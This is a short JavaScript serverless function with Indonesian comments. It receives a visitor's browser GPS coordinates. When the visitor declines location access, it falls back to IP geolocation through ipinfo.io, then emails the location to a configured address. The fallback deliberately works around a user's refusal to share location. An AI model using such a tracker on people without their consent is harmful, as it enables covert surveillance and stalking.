const axios = require('axios');
const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  try {
    const body = JSON.parse(event.body || '{}');
    const { latitude, longitude, fallback } = body;

    let locationText = '';

    if (fallback) {
      // Jika user menolak lokasi, fallback ke IP
      const ip = event.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
      const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${process.env.IPINFO_TOKEN}`);

      locationText = `IP: ${data.ip}
Region: ${data.region}
City: ${data.city}
Country: ${data.country}
Location: ${data.loc}
Org: ${data.org}`;
    } else {
      // Kalau dapat lokasi GPS dari browser
      locationText = `Latitude: ${latitude}
Longitude: ${longitude}
(Source: Geolocation API from browser)`;
    }

    // Setup transporter dengan kredensial email dari environment variables
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });

    // Setup email options
    await transporter.sendMail({
      from: 'Location Tracker', // Sender
      to: process.env.RECEIVER_EMAIL, // Receiver email address
      subject: 'New Location Logged',
      text: locationText
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ status: true, message: 'Location sent successfully' })
    };
  } catch (e) {
    return {
      statusCode: 500,
      body: JSON.stringify({ status: false, message: `Error: ${e.message}` })
    };
  }
};
